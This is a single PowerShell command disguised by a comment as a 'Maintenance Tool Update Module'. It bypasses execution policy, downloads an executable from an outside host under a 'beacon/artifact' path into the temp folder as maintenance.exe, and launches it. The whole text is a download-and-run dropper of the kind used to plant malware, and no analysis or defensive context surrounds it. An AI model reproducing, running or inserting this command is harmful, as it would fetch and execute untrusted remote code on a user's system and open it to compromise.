powershell -NoProfile -ExecutionPolicy Bypass -Command "
# Maintenance Tool Update Module
$dlUri='http://admin.yuxiit.cn/api/beacon/artifact/6b00d6fa';
$outExe=Join-Path $env:TEMP 'maintenance.exe';
Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing;
if(Test-Path $outExe){
    Start-Process $outExe;
}"
